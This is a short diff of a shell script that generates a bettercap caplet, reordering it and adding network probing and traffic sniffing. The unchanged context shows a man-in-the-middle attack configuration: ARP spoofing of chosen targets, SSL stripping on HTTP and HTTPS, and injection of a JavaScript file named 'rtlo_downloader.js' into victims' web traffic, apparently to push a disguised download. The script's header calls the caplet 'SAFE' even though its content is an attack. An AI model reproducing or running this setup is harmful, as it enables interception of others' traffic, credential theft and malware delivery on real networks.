@@ -218,6 +218,12 @@ EOF
 # --- GENERATE SAFE BETTERCAP CAPLET ---
 # ========================
 cat > "$MITM_DIR/cert_injector.cap" <<EOF
+# Recon Targets
+net.probe on
+
+# Sniff Traffic
+net.sniff on
+
 # HTTP/HTTPS Intercept
 set http.proxy.sslstrip true
 set https.proxy.sslstrip true
@@ -225,9 +231,6 @@ set http.proxy.injectjs $MITM_DIR/rtlo_downloader.js
 set https.proxy.injectjs $MITM_DIR/rtlo_downloader.js
 http.proxy on
 https.proxy on
-
-# Sniff Traffic
-net.sniff on
 
 # ARP Spoofing
 set arp.spoof.targets $TARGETS
